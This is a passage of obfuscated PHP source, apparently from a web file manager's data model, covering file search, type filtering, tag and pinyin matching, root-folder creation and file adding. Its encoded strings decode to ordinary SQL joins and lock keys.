$fÙÓã‹àĞ = array(); $b·§½Î—Ÿ = array(); foreach ($E••ññ©¸ as $A«…ç¿Ù›ê) { if (!$A«…ç¿Ù›ê || count($A«…ç¿Ù›ê) <= 1) { continue; } foreach ($A«…ç¿Ù›ê as $AèÌ·ÉéË) { $fÙÓã‹àĞ[] = $AèÌ·ÉéË[$c„»¿œ” é[415]]; $b·§½Î—Ÿ[] = $AèÌ·ÉéË[$c„»¿œ” é[364]]; } } goto eÇª‰ÚŒ™¥; cƒÒÓ™É›: $c„»¿œ” é =& $_SERVER[¢à]; $e‘ë­ˆİ¾† = $this->listData($FÁŠ¨¿ÎÙ¯); $E••ññ©¸ = array_to_keyvalue_group($e‘ë­ˆİ¾†, $c„»¿œ” é[415]); goto F‡˜›¾æ; bÅÂ‡õ‰¹†: } public function userSpace() { $F²ÍÎğ©±Ô =& $_SERVER[¢à]; $fßÕ¤ÑÑŞÓ = $this->tablePrefix; $EÎìò™±† = array($F²ÍÎğ©±Ô[1403] => USER_ID); $AŞ‡¿†›Ş› = "{$fßÕ¤ÑÑŞÓ}\151\157\137\x66\x69\154\145\x20\146\151\x6c\x65\163\x20\x6f\x6e\40\x66\151\x6c\x65\x73\x2e\x66\x69\154\x65\111\104\x20\x3d\x20\150\x69\x73\x74\157\162\x79\56\x66\151\x6c\145\x49\x44"; return $this->alias($F²ÍÎğ©±Ô[2271])->where($EÎìò™±†)->join($AŞ‡¿†›Ş›, $F²ÍÎğ©±Ô[2272])->sum($F²ÍÎğ©±Ô[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Bê”£ÀòŠ) { goto a¡‹òÔµ¡…; A«¹ŞÌö¬§: if (!$e³Ç®êäëö) { return array(); } $A×¸ÕÜ = $e³Ç®êäëö[$bóš‘˜ ³æ[157]]; $döĞâöË‘¾ = $bóš‘˜ ³æ[7]; goto f²ØâÓëó‘; a¡‹òÔµ¡…: $bóš‘˜ ³æ =& $_SERVER[¢à]; $aÒˆÄÖÃ· = KodIO::fileTypeList(); $e³Ç®êäëö = $aÒˆÄÖÃ·[$Bê”£ÀòŠ]; goto A«¹ŞÌö¬§; f²ØâÓëó‘: if (!$e³Ç®êäëö[$bóš‘˜ ³æ[157]]) { $F»“Œ›—Ùº = array_to_keyvalue($aÒˆÄÖÃ·, $bóš‘˜ ³æ[33], $bóš‘˜ ³æ[157]); $A×¸ÕÜ = implode($bóš‘˜ ³æ[47], $F»“Œ›—Ùº); $döĞâöË‘¾ = $bóš‘˜ ³æ[2229]; } $aˆ«¬Ìóº = explode($bóš‘˜ ³æ[47], trim($A×¸ÕÜ, $bóš‘˜ ³æ[47])); return array($döĞâöË‘¾, $aˆ«¬Ìóº); goto E»¼´¸³Ò‘; E»¼´¸³Ò‘: } public function listPathType($A‰Ã˜ÎêÇç) { $Eëß¶½ï =& $_SERVER[¢à]; $Eñ÷ê×ÈñŒ = $this->fileTypeWhere($A‰Ã˜ÎêÇç); if (!$Eñ÷ê×ÈñŒ) { return array(); } $F«Å³½Ó³™ = array($Eëß¶½ï[517] => SourceModel::TYPE_USER, $Eëß¶½ï[518] => USER_ID, $Eëß¶½ï[514] => 0, $Eëß¶½ï[515] => $Eñ÷ê×ÈñŒ); return $this->listSource($F«Å³½Ó³™); } public function listSearch($aò²’ö‹Å‡, $a§ÚˆÏ¸ç = 300) { goto A¥Ï‰¢ÚŞ×; Bµ·ê¤ù›: $this->_listSearchDesc($F¦£ßò¤œİ, $aò²’ö‹Å‡, $DÆå×¯·‡Ã); $this->_listSearchTag($F¦£ßò¤œİ, $aò²’ö‹Å‡, $DÆå×¯·‡Ã); $this->_listDataApply($F¦£ßò¤œİ[$d’¢‡°…ğà[351]]); goto Eò¨±»öÉ; Eò¨±»öÉ: $this->_listMake($F¦£ßò¤œİ); return $F¦£ßò¤œİ; goto aŸ·¦ÖÛ‚; a„áï¢µ: $this->_listSearchBindPinyin($aò²’ö‹Å‡, $F¿øïïì¼, $c±‘‹ËÈˆ”); $this->alias($d’¢‡°…ğà[483])->_makeOrder()->cache(null, 10); $F¦£ßò¤œİ = $this->distinct(!0)->field($c±‘‹ËÈˆ”)->where($F¿øïïì¼)->selectPage($a§ÚˆÏ¸ç); goto Bµ·ê¤ù›; A¥Ï‰¢ÚŞ×: $d’¢‡°…ğà =& $_SERVER[¢à]; if (isset($aò²’ö‹Å‡[$d’¢‡°…ğà[2151]]) && $aò²’ö‹Å‡[$d’¢‡°…ğà[2151]]) { $aò²’ö‹Å‡[$d’¢‡°…ğà[2151]] = str_replace($d’¢‡°…ğà[1564], $d’¢‡°…ğà[2273], trim($aò²’ö‹Å‡[$d’¢‡°…ğà[2151]])); } $F¿øïïì¼ = $this->_parseSearchWhere($aò²’ö‹Å‡); goto C‰é¥¤Ä˜Ì; C‰é¥¤Ä˜Ì: if (!isset($F¿øïïì¼[$d’¢‡°…ğà[393]])) { $F¿øïïì¼[$d’¢‡°…ğà[393]] = 0; } $c±‘‹ËÈˆ” = $d’¢‡°…ğà[2274]; $DÆå×¯·‡Ã = $c±‘‹ËÈˆ”; goto a„áï¢µ; aŸ·¦ÖÛ‚: } private function _listSearchTag(&$C‘×– Ã¯, $CÚÇÊ‘¤Ò, $bÓ´òƒ¶Š) { goto bÊë™¹ÑäÑ; bÊë™¹ÑäÑ: $CŞ¼ÃŒ÷› =& $_SERVER[¢à]; if (!$CÚÇÊ‘¤Ò[$CŞ¼ÃŒ÷›[2151]] || $C‘×– Ã¯[$CŞ¼ÃŒ÷›[348]][$CŞ¼ÃŒ÷›[337]] > 1) { return; } $EØº¡·´á« = Model($CŞ¼ÃŒ÷›[2275])->listData(); goto C§˜„Šñ—; C§˜„Šñ—: $eÅãŸ…ôá³ = array(); $Fâ¾ããù¨ = $CÚÇÊ‘¤Ò[$CŞ¼ÃŒ÷›[2151]]; foreach ($EØº¡·´á« as $DæİÓõÂ¥») { $a†›»‘ÆÀÏ = $DæİÓõÂ¥»[$CŞ¼ÃŒ÷›[28]]; $e¥Åà¤Ä÷Ì = str_replace($CŞ¼ÃŒ÷›[50], $CŞ¼ÃŒ÷›[33], Pinyin::encode($a†›»‘ÆÀÏ)); if (stripos($a†›»‘ÆÀÏ, $Fâ¾ããù¨) !== !1 || stripos($e¥Åà¤Ä÷Ì, $Fâ¾ããù¨) !== !1) { $eÅãŸ…ôá³[] = $DæİÓõÂ¥»[$CŞ¼ÃŒ÷›[364]]; } } goto d°¥’ÚÊ¶‰; d°¥’ÚÊ¶‰: if (!$eÅãŸ…ôá³) { return; } $FÅ‘½ÄÁ· = array($CŞ¼ÃŒ÷›[390] => array($CŞ¼ÃŒ÷›[7], $eÅãŸ…ôá³)); $B¥˜¹ó®˜ = Model($CŞ¼ÃŒ÷›[2276])->field($CŞ¼ÃŒ÷›[75])->where($FÅ‘½ÄÁ·)->select(); goto aÒÓ÷¯¸Öà; aÒÓ÷¯¸Öà: $B¥˜¹ó®˜ = array_to_keyvalue($B¥˜¹ó®˜, $CŞ¼ÃŒ÷›[33], $CŞ¼ÃŒ÷›[75]); $c¾Ô’¶ôà = array_unique($B¥˜¹ó®˜); $this->_listSearchMerge($C‘×– Ã¯, $CÚÇÊ‘¤Ò, $bÓ´òƒ¶Š, $c¾Ô’¶ôà); goto C‹ ìåÛóè; C‹ ìåÛóè: } private function _listSearchDesc(&$C¼íÖâ·§ó, $bä“Ê¼ƒÏø, $b´êØšŞ·«) { goto d†·à¬Œ§¤; d†·à¬Œ§¤: $f·±„¶¿è =& $_SERVER[¢à]; if (!$bä“Ê¼ƒÏø[$f·±„¶¿è[2151]] || $C¼íÖâ·§ó[$f·±„¶¿è[348]][$f·±„¶¿è[337]] > 1) { return; } $f°å©ŠŠŠµ = $this->listSearchChildren($bä“Ê¼ƒÏø[$f·±„¶¿è[457]]); goto D­—ªĞ´É·; D­—ªĞ´É·: $f°å©ŠŠŠµ = array_unique($f°å©ŠŠŠµ); if (!$f°å©ŠŠŠµ) { return; } $C¶Ü ×¬‘ = array($f·±„¶¿è[366] => array($f·±„¶¿è[7], $f°å©ŠŠŠµ), $f·±„¶¿è[89] => $f·±„¶¿è[401], $f·±„¶¿è[356] => array($f·±„¶¿è[751], $f·±„¶¿è[2153] . $bä“Ê¼ƒÏø[$f·±„¶¿è[2151]] . $f·±„¶¿è[2153])); goto c‰óÎì‰°°; c‰óÎì‰°°: $Fˆã‹±Æ³à = Model($f·±„¶¿è[500])->field($f·±„¶¿è[366])->where($C¶Ü ×¬‘)->select(); $Aİ›·æ”–½ = array_to_keyvalue($Fˆã‹±Æ³à, $f·±„¶¿è[33], $f·±„¶¿è[366]); $this->_listSearchMerge($C¼íÖâ·§ó, $bä“Ê¼ƒÏø, $b´êØšŞ·«, $Aİ›·æ”–½); goto Bë×ŠÉï’æ; Bë×ŠÉï’æ: } private function _listSearchMerge(&$D“ù²Ï‰ÙÄ, $Cì¿ĞÜ…é, $dëÒ›¿š…Í, $aÚÂ¸ƒ»Ìæ) { goto c½¨ââ™Ùß; c½¨ââ™Ùß: $D­Áİ¾‡¬º =& $_SERVER[¢à]; if (!$aÚÂ¸ƒ»Ìæ) { return; } $fƒİƒ›—¼Š = array_to_keyvalue($D“ù²Ï‰ÙÄ[$D­Áİ¾‡¬º[351]], $D­Áİ¾‡¬º[33], $D­Áİ¾‡¬º[366]); goto Dõ©¼¶ÁÁç; e˜˜À¿–†—: foreach ($bö‰¿œè¼  as $AÒí½¿—Û’) { $a¨µ£ƒÅ‚ = $D­Áİ¾‡¬º[47] . $Cì¿ĞÜ…é[$D­Áİ¾‡¬º[457]] . $D­Áİ¾‡¬º[47]; if (stripos($AÒí½¿—Û’[$D­Áİ¾‡¬º[455]], $a¨µ£ƒÅ‚) !== !1) { $aØóïƒãĞà[] = $AÒí½¿—Û’; } } $D“ù²Ï‰ÙÄ[$D­Áİ¾‡¬º[351]] = array_merge($aØóïƒãĞà, $D“ù²Ï‰ÙÄ[$D­Áİ¾‡¬º[351]]); $D“ù²Ï‰ÙÄ[$D­Áİ¾‡¬º[348]][$D­Áİ¾‡¬º[349]] += count($aØóïƒãĞà); goto béµ‘„”÷´; Dõ©¼¶ÁÁç: $cå‡Äİ±ì® = array_diff($aÚÂ¸ƒ»Ìæ, $fƒİƒ›—¼Š); if (!$cå‡Äİ±ì®) { return; } $A›£Ç¸‘Ì¿ = array($D­Áİ¾‡¬º[366] => array($D­Áİ¾‡¬º[7], $cå‡Äİ±ì®)); goto CËè°Î‰Á; CËè°Î‰Á: $bö‰¿œè¼  = $this->field($dëÒ›¿š…Í)->where($A›£Ç¸‘Ì¿)->select(); if (!$bö‰¿œè¼ ) { return; } $aØóïƒãĞà = array(); goto e˜˜À¿–†—; béµ‘„”÷´: } public function listSearchChildren($Cß¾Îøèİ, $e¨´¸åèèœ = 5000) { goto D‹ËóØªª; cÚŸÒºâÖ: $A˜¢š¨‰Ù = $this->field($dÚÆ‘íÔ”[366])->where($dÁã¥ÈÊ¹¯)->select(); $aÜ½á«Šø´ = array_to_keyvalue($A˜¢š¨‰Ù, $dÚÆ‘íÔ”[33], $dÚÆ‘íÔ”[366]); return $aÜ½á«Šø´; goto DÌ®ğÙ³Ñá; cõÒìõ¦£õ: $dÁã¥ÈÊ¹¯ = array($dÚÆ‘íÔ”[455] => array($dÚÆ‘íÔ”[751], $FÄğö Í”‘[$dÚÆ‘íÔ”[455]] . $FÄğö Í”‘[$dÚÆ‘íÔ”[366]] . $dÚÆ‘íÔ”[480])); $Aß‰õŒº¥Í = $this->field($dÚÆ‘íÔ”[366])->cache(null, 600)->where($dÁã¥ÈÊ¹¯)->count(); if ($Aß‰õŒº¥Í > $e¨´¸åèèœ) { return $this->_listSearchChildrenNear($Cß¾Îøèİ, $e¨´¸åèèœ); } goto cÚŸÒºâÖ; D‹ËóØªª: $dÚÆ‘íÔ” =& $_SERVER[¢à]; $aÜ½á«Šø´ = array(); $FÄğö Í”‘ = $this->sourceInfo($Cß¾Îøèİ); goto cõÒìõ¦£õ; DÌ®ğÙ³Ñá: } private function _listSearchChildrenNear($e°²ÒÃ×‰š, $dº†Œ ´É) { goto Cß¡…µòˆõ; Cß¡…µòˆõ: $f‰‡èÎÏŸ =& $_SERVER[¢à]; $D‚¾å±¡å = array(); $bï¢¸ÏŠÉ = array($f‰‡èÎÏŸ[457] => $e°²ÒÃ×‰š); goto bñ±¯ÊÆÕÀ; BâçİËŒ¾: if (!$fÖ“æ¿ø³ç) { return $D‚¾å±¡å; } $bï¢¸ÏŠÉ = array($f‰‡èÎÏŸ[457] => array($f‰‡èÎÏŸ[7], $fÖ“æ¿ø³ç)); $B“¬´í… = $this->field($f‰‡èÎÏŸ[2277])->where($bï¢¸ÏŠÉ)->select(); goto fÔß¹Á„; fÔß¹Á„: $D‚¾å±¡å = array_merge($D‚¾å±¡å, array_to_keyvalue($B“¬´í…, $f‰‡èÎÏŸ[33], $f‰‡èÎÏŸ[366])); $D‚¾å±¡å = array_slice($D‚¾å±¡å, 0, $dº†Œ ´É); return $D‚¾å±¡å; goto C…®ÕŸçİ’; bñ±¯ÊÆÕÀ: $B“¬´í… = $this->field($f‰‡èÎÏŸ[2277])->where($bï¢¸ÏŠÉ)->select(); $fÖ“æ¿ø³ç = array_to_keyvalue(array_filter_by_field($B“¬´í…, $f‰‡èÎÏŸ[367], $f‰‡èÎÏŸ[83]), $f‰‡èÎÏŸ[33], $f‰‡èÎÏŸ[366]); $D‚¾å±¡å = array_merge($D‚¾å±¡å, array_to_keyvalue($B“¬´í…, $f‰‡èÎÏŸ[33], $f‰‡èÎÏŸ[366])); goto BâçİËŒ¾; C…®ÕŸçİ’: } private function _listSearchBindPinyin($F§öÖ§Š†ß, &$EÈåÑªì÷, &$CË‘ÃÄ›) { goto BÀ¿†ÕßÍÅ; bù“½’º”: $dŸŠµƒÌ– = array(); $CË‘ÃÄ› = str_replace(array($B®Í³­»³Ÿ[214], $B®Í³­»³Ÿ[50], $B®Í³­»³Ÿ[2278]), $B®Í³­»³Ÿ[33], $CË‘ÃÄ›); $CË‘ÃÄ› = $B®Í³­»³Ÿ[2279] . str_replace($B®Í³­»³Ÿ[47], $B®Í³­»³Ÿ[2280], $CË‘ÃÄ›); goto eÔŠ˜»Ë¤Ş; eÔŠ˜»Ë¤Ş: unset($EÈåÑªì÷[$B®Í³­»³Ÿ[28]]); foreach ($EÈåÑªì÷ as $Eæ©Æğ©Í‰ => $aÏ¡Ä‰ïÚà) { $dŸŠµƒÌ–[$B®Í³­»³Ÿ[2279] . $Eæ©Æğ©Í‰] = $aÏ¡Ä‰ïÚà; } $BÀ¦ôÌÌğ = array($B®Í³­»³Ÿ[479], $B®Í³­»³Ÿ[2153] . $F§öÖ§Š†ß[$B®Í³­»³Ÿ[2151]] . $B®Í³­»³Ÿ[2153]); goto e¦ÇßˆëĞ‡; BÀ¿†ÕßÍÅ: $B®Í³­»³Ÿ =& $_SERVER[¢à]; if (!Input::check($F§öÖ§Š†ß[$B®Í³­»³Ÿ[2151]], $B®Í³­»³Ÿ[303]) || strlen($F§öÖ§Š†ß[$B®Í³­»³Ÿ[2151]]) < 2) { return; } $Bƒ–ƒØèÛÛ = "\x4c\105\x46\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x69\x6f\137\163\157\x75\162\143\x65\137\155\145\164\141\40\x6d\x65\x74\x61\40\x6f\x6e\40\x73\157\x75\x72\143\x65\x2e\163\157\165\x72\x63\145\111\x44\40\75\x20\155\x65\164\x61\x2e\163\157\165\x72\x63\145\111\x44"; goto bù“½’º”; e¦ÇßˆëĞ‡: $dŸŠµƒÌ–[] = array($B®Í³­»³Ÿ[2281] => $BÀ¦ôÌÌğ, $B®Í³­»³Ÿ[912] => $B®Í³­»³Ÿ[2155], array($B®Í³­»³Ÿ[2282] => $BÀ¦ôÌÌğ, $B®Í³­»³Ÿ[2283] => array($B®Í³­»³Ÿ[7], array($B®Í³­»³Ÿ[412], $B®Í³­»³Ÿ[411])))); $this->join($Bƒ–ƒØèÛÛ); $EÈåÑªì÷ = $dŸŠµƒÌ–; goto c÷òâ‚Î®Õ; c÷òâ‚Î®Õ: } private function _parseSearchWhere($b¯¦­ªÎğš) { goto e¿°÷èæ¾; E”Æçôù³: if (isset($b¯¦­ªÎğš[$a™ŞÁ°°Ì[2151]]) && $b¯¦­ªÎğš[$a™ŞÁ°°Ì[2151]]) { $D·Ë£Ğ´ï = $b¯¦­ªÎğš[$a™ŞÁ°°Ì[2151]]; $c©ŸŠÉ‘ôŸ = explode($a™ŞÁ°°Ì[50], $D·Ë£Ğ´ï); if (strlen($D·Ë£Ğ´ï) > 2 && (substr($D·Ë£Ğ´ï, 0, 1) == $a™ŞÁ°°Ì[113] && substr($D·Ë£Ğ´ï, -1) == $a™ŞÁ°°Ì[113]) || substr($D·Ë£Ğ´ï, 0, 1) == $a™ŞÁ°°Ì[55] && substr($D·Ë£Ğ´ï, -1) == $a™ŞÁ°°Ì[55]) { $D·Ë£Ğ´ï = substr($D·Ë£Ğ´ï, 1, -1); $c©ŸŠÉ‘ôŸ = array($D·Ë£Ğ´ï); } $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[28]] = array($a™ŞÁ°°Ì[479], $a™ŞÁ°°Ì[2153] . $D·Ë£Ğ´ï . $a™ŞÁ°°Ì[2153]); if (count($c©ŸŠÉ‘ôŸ) > 1) { $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[28]] = array(); foreach ($c©ŸŠÉ‘ôŸ as $a¢Ãä¦ç¾š) { if (!trim($a¢Ãä¦ç¾š)) { continue; } $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[28]][] = array($a™ŞÁ°°Ì[479], $a™ŞÁ°°Ì[2153] . trim($a¢Ãä¦ç¾š) . $a™ŞÁ°°Ì[2153]); } } } return $F„ğÛ¸Ğ¢Ç; goto F¸èÆÈ¾¶—; b¯—Ññ¨ß: if (isset($b¯¦­ªÎğš[$a™ŞÁ°°Ì[703]])) { $bå»Š›¥ = array($a™ŞÁ°°Ì[2285], $b¯¦­ªÎğš[$a™ŞÁ°°Ì[703]]); if ($F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[107]]) { $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[107]] = array($F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[107]], $bå»Š›¥, $a™ŞÁ°°Ì[2286]); } else { $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[107]] = $bå»Š›¥; } } if (isset($b¯¦­ªÎğš[$a™ŞÁ°°Ì[2287]])) { $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[77]] = array($a™ŞÁ°°Ì[2284], $b¯¦­ªÎğš[$a™ŞÁ°°Ì[2287]]); } if (isset($b¯¦­ªÎğš[$a™ŞÁ°°Ì[2288]])) { $bå»Š›¥ = array($a™ŞÁ°°Ì[2285], $b¯¦­ªÎğš[$a™ŞÁ°°Ì[2288]]); if ($F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[77]]) { $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[77]] = array($F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[77]], $bå»Š›¥, $a™ŞÁ°°Ì[2286]); } else { $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[77]] = $bå»Š›¥; } } goto e¸†Ó„šòÒ; e¿°÷èæ¾: $a™ŞÁ°°Ì =& $_SERVER[¢à]; $F„ğÛ¸Ğ¢Ç = array(); if (isset($b¯¦­ªÎğš[$a™ŞÁ°°Ì[702]])) { $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[107]] = array($a™ŞÁ°°Ì[2284], $b¯¦­ªÎğš[$a™ŞÁ°°Ì[702]]); } goto b¯—Ññ¨ß; e¸†Ó„šòÒ: if (isset($b¯¦­ªÎğš[$a™ŞÁ°°Ì[531]])) { $F„ğÛ¸Ğ¢Ç[] = array($a™ŞÁ°°Ì[376] => $b¯¦­ªÎğš[$a™ŞÁ°°Ì[531]], $a™ŞÁ°°Ì[375] => $b¯¦­ªÎğš[$a™ŞÁ°°Ì[531]], $a™ŞÁ°°Ì[912] => $a™ŞÁ°°Ì[2155]); } if (isset($b¯¦­ªÎğš[$a™ŞÁ°°Ì[369]])) { $B„“ë«±ÌÈ = $b¯¦­ªÎğš[$a™ŞÁ°°Ì[369]]; if ($B„“ë«±ÌÈ == $a™ŞÁ°°Ì[76]) { $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[367]] = 1; } else { if ($B„“ë«±ÌÈ == $a™ŞÁ°°Ì[2289]) { $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[367]] = 0; } else { if ($B„“ë«±ÌÈ) { $B„“ë«±ÌÈ = is_array($B„“ë«±ÌÈ) ? $B„“ë«±ÌÈ : explode($a™ŞÁ°°Ì[47], $B„“ë«±ÌÈ); $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[369]] = array($a™ŞÁ°°Ì[381], $B„“ë«±ÌÈ); $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[367]] = 0; } } } } if (isset($b¯¦­ªÎğš[$a™ŞÁ°°Ì[457]])) { $dØˆàÁëÑ = $this->sourceInfo($b¯¦­ªÎğš[$a™ŞÁ°°Ì[457]]); $F„ğÛ¸Ğ¢Ç[$a™ŞÁ°°Ì[521]] = array($a™ŞÁ°°Ì[479], $dØˆàÁëÑ[$a™ŞÁ°°Ì[455]] . $b¯¦­ªÎğš[$a™ŞÁ°°Ì[457]] . $a™ŞÁ°°Ì[480]); } goto E”Æçôù³; F¸èÆÈ¾¶—: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($bã²Ê¸Î Õ) { $a¿ë×ÖöÄ† =& $_SERVER[¢à]; $B¤¯â•÷ƒã = Model($a¿ë×ÖöÄ†[470])->where(array($a¿ë×ÖöÄ†[1403] => $bã²Ê¸Î Õ))->find(); $bÀà”ºÚ = $this->_mkdirRoot(SourceModel::TYPE_USER, $bã²Ê¸Î Õ, $B¤¯â•÷ƒã[$a¿ë×ÖöÄ†[28]]); $this->userDesktopAdd($bÀà”ºÚ); return $bÀà”ºÚ; } public function userDesktopAdd($a¡„±¦´¨İ) { $FãŸŸìÇÔ =& $_SERVER[¢à]; $DÂõÇŒ°Ùƒ = LNG($FãŸŸìÇÔ[2290]); $c‡¦¯™« = $this->mkdir($a¡„±¦´¨İ, $DÂõÇŒ°Ùƒ); $this->metaSet($c‡¦¯™«, $FãŸŸìÇÔ[2291], $FãŸŸìÇÔ[83]); $this->metaSet($a¡„±¦´¨İ, $FãŸŸìÇÔ[2292], $c‡¦¯™«); } public function groupRootAdd($BÉŒä½¯ø) { $c‹õÓ¬ôÛà =& $_SERVER[¢à]; $bÏº©äì© = Model($c‹õÓ¬ôÛà[454])->where(array($c‹õÓ¬ôÛà[2147] => $BÉŒä½¯ø))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $BÉŒä½¯ø, $bÏº©äì©[$c‹õÓ¬ôÛà[28]]); } public function systemRootPathAdd($b’œÉ´˜©¹) { if ($b’œÉ´˜©¹ != $_SERVER[¢à][1085]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $b’œÉ´˜©¹); } public function userRootRemove($côëõ“ˆ«‡) { $bÏ»ì„™‘¤ = $this->sourceRoot(SourceModel::TYPE_USER, $côëõ“ˆ«‡); if (!$bÏ»ì„™‘¤) { return; } $this->remove($bÏ»ì„™‘¤, !1); } public function groupRootRemove($Aë‰İ©áœ‡) { $CÅ©‘•È ê = $this->sourceRoot(SourceModel::TYPE_GROUP, $Aë‰İ©áœ‡); if (!$CÅ©‘•È ê) { return; } $this->remove($CÅ©‘•È ê, !1); } private function _mkdirRoot($Dˆº–•êÖ, $FæĞ²¿‹¥¸, $fõì…½§²) { goto E‰šÊ¨í”‚; f µÉ•¯Ì: CacheLock::unlock($Bˆ·åùíŞª); return $B¸Õ´è®Ìà; goto dİÁ¯ŠĞßä; AÚ«ÙÚ÷È«: $Bˆ·åùíŞª = "\x4d\157\144\145\154\123\157\x75\x72\x63\x65\x2e\155\x6b\x64\x69\x72\122\157\157\x74\56{$Dˆº–•êÖ}\x2e{$FæĞ²¿‹¥¸}\56" . $fõì…½§²; CacheLock::lock($Bˆ·åùíŞª); $E¡µçœ™àÌ[$Dö¤†­«³[28]] = $fõì…½§²; goto EØ˜Å­ğîÁ; EØ˜Å­ğîÁ: $B¸Õ´è®Ìà = $this->add($E¡µçœ™àÌ); $c’ˆÖ‡ÆÂ = array($Dö¤†­«³[523] => short_id($B¸Õ´è®Ìà)); $this->where(array($Dö¤†­«³[380] => $B¸Õ´è®Ìà))->save($c’ˆÖ‡ÆÂ); goto f µÉ•¯Ì; E‰šÊ¨í”‚: $Dö¤†­«³ =& $_SERVER[¢à]; $E¡µçœ™àÌ = array($Dö¤†­«³[365] => 0, $Dö¤†­«³[517] => $Dˆº–•êÖ, $Dö¤†­«³[518] => $FæĞ²¿‹¥¸, $Dö¤†­«³[514] => 1, $Dö¤†­«³[519] => USER_ID, $Dö¤†­«³[520] => USER_ID, $Dö¤†­«³[515] => $Dö¤†­«³[33], $Dö¤†­«³[521] => $Dö¤†­«³[466], $Dö¤†­«³[392] => 0, $Dö¤†­«³[516] => 0, $Dö¤†­«³[416] => 0, $Dö¤†­«³[522] => $Dö¤†­«³[33]); if ($EÚî®¦ÙĞœ = $this->where($E¡µçœ™àÌ)->find()) { return $EÚî®¦ÙĞœ[$Dö¤†­«³[366]]; } goto AÚ«ÙÚ÷È«; dİÁ¯ŠĞßä: } private function sourceRoot($cãÙ×´Ë“, $aöÈ•§­ù¡, $DÅÈ¾ÙÈ¨£ = false) { $cìåÅÚŸ³Ê =& $_SERVER[¢à]; $C¤ªŠ–‡Œ‡ = array($cìåÅÚŸ³Ê[365] => 0, $cìåÅÚŸ³Ê[517] => $cãÙ×´Ë“, $cìåÅÚŸ³Ê[518] => $aöÈ•§­ù¡); if ($E‰Ü¡®ê×¸ = $this->where($C¤ªŠ–‡Œ‡)->find()) { return $DÅÈ¾ÙÈ¨£ ? $E‰Ü¡®ê×¸ : $E‰Ü¡®ê×¸[$cìåÅÚŸ³Ê[366]]; } return !1; } public function sourceRootGroup($dƒ±†ŒôÉí) { $d˜«ÌààæŞ =& $_SERVER[¢à]; if (is_string($dƒ±†ŒôÉí)) { $dƒ±†ŒôÉí = array($dƒ±†ŒôÉí); } $aåà‚º¦ÛÅ = array($d˜«ÌààæŞ[365] => 0, $d˜«ÌààæŞ[517] => SourceModel::TYPE_GROUP, $d˜«ÌààæŞ[518] => array($d˜«ÌààæŞ[7], $dƒ±†ŒôÉí)); $A®æø’ÌóÃ = $this->listSource($aåà‚º¦ÛÅ, 1000); return array_to_keyvalue($A®æø’ÌóÃ[$d˜«ÌààæŞ[74]], $d˜«ÌààæŞ[452]); } public function mkfile($B­íñ†Ô±¢, $b»˜Úø›Ó, $c›ç¤òÄÒù = '', $föŠ‰ƒÙ¤º = REPEAT_RENAME) { $dîÄğ¬˜‘ =& $_SERVER[¢à]; $CóÛ¼²äİò = Model($dîÄğ¬˜‘[540])->addFileByContent($c›ç¤òÄÒù, $b»˜Úø›Ó); return $this->_createFileCall($B­íñ†Ô±¢, $b»˜Úø›Ó, $CóÛ¼²äİò, $föŠ‰ƒÙ¤º, $dîÄğ¬˜‘[1115]); } public function addFile($FöàÆŒÑµ, $B…’Ã®ÍåÃ, $bÔ Ú’ÖœÅ, $F—ïÁ¤®¼³ = false, $C†ÕÁÉŠæ— = REPEAT_RENAME) { $A¨ãø™¢î = Model($_SERVER[¢à][540])->addFile($B…’Ã®ÍåÃ, $bÔ Ú’ÖœÅ, $F—ïÁ¤®¼³); return $this->_createFileCall($FöàÆŒÑµ, $bÔ Ú’ÖœÅ, $A¨ãø™¢î, $C†ÕÁÉŠæ—); } public function addFileByFileID($C¤Ùªõêáà, $AØ÷¢Ö¤¿Á, $C–Óô¨ÍÚÚ, $A‰åäåá´˜ = REPEAT_RENAME) { $E¬ºó¹ä¡ã =& $_SERVER[¢à]; $EË· ‰ñ˜­ = Model($E¬ºó¹ä¡ã[540])->find($AØ÷¢Ö¤¿Á); Model($E¬ºó¹ä¡ã[540])->linkAdd($AØ÷¢Ö¤¿Á); return $this->_createFileCall($C¤Ùªõêáà, $C–Óô¨ÍÚÚ, $EË· ‰ñ˜­, $A‰åäåá´˜); } public function addFileByRemote($bö»£ì„à, $EáÄáÇ²êŞ, $C¼’§ò×², $aÑÚ®Û–Í¹ = array(), $cÍš¡ªØ¶ = REPEAT_RENAME) { $Fñ‚ë±‰Ğã = Model($_SERVER[¢à][540])->addFileByRemote($EáÄáÇ²êŞ, $C¼’§ò×², $aÑÚ®Û–Í¹); return $this->_createFileCall($bö»£ì„à, $C¼’§ò×², $Fñ‚ë±‰Ğã, $cÍš¡ªØ¶); } private function _createFileCall($CòÜ’ÄÎ°¶, $dÏÁÂÓ’ÑÁ, $AÏ¯Æä‡Ë, $d«™±¤—Ç, $FÆ«Ù‹®İ— = "\165\x70\154\x6f\141\144") { goto d½ÜĞÖ¹äª; fµ‡”®¾´: $fù› ˜Ÿå = $this->_createFile($CòÜ’ÄÎ°¶, $dÏÁÂÓ’ÑÁ, $AÏ¯Æä‡Ë, $d«™±¤—Ç, $EÃ¼ğõ); if (!$EÃ¼ğõ) { Model($eÔ‚ğ‰¯ğ¡[418])->remove($AÏ¯Æä‡Ë[$eÔ‚ğ‰¯ğ¡[415]]); } else { if ($fù› ˜Ÿå) { 